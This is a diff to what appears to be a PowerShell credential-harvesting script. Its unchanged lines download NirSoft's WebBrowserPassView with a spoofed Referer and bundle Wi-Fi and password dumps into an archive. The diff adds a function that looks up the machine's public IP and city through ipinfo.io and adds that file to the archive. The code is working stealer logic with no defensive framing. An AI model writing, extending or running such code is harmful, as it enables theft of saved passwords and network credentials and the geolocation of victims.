@@ -18,6 +18,16 @@ function GetWifi {
 }
 
 
+function GetIP {
+   $response = Invoke-WebRequest -Uri "http://ipinfo.io/json" | ConvertFrom-Json
+   $ip = $response.ip
+   $location = $response.city + ", " + $response.country
+
+   $info = "IP: $ip`nLocation: $location"
+   $info | Out-File -FilePath "C:\temp\IP.txt"
+}
+
+
 function GetNirsoft {
   cd \temp
   Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
@@ -36,6 +46,7 @@ function Create7z {
     $filesToArchive = @(
         "C:\temp\Version.txt",
         "C:\temp\Wifi.txt",
+        "C:\temp\IP.txt",
         "C:\temp\Pass.txt"
     )
 
